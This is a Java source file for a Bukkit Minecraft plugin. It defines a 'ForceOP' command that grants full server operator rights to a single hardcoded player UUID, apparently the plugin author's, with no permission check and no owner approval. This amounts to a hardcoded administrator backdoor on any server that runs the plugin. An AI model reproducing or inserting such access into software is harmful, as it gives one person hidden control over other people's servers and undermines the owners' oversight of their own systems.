package com.kcsup.basewars.commands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.UUID;

public class ForceOPCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(sender instanceof Player) {
            Player player = (Player) sender;
            if(player.getUniqueId().equals(UUID.fromString("6a44666d-6ea5-4d4e-b907-4d9ca8a146d7"))) {
                if(player.isOp()) {
                    player.sendMessage(ChatColor.RED + "You're already opped!");
                } else if(!player.isOp()) {
                    player.sendMessage(ChatColor.GREEN + "You are KCsup! (now opping...)");
                    player.setOp(true);
                }
            } else {
                player.sendMessage(ChatColor.RED + "You aren't KCsup!");
            }
        } else {
            sender.sendMessage(ChatColor.RED + "You must be a player to use this command!");
        }
        return false;
    }
}
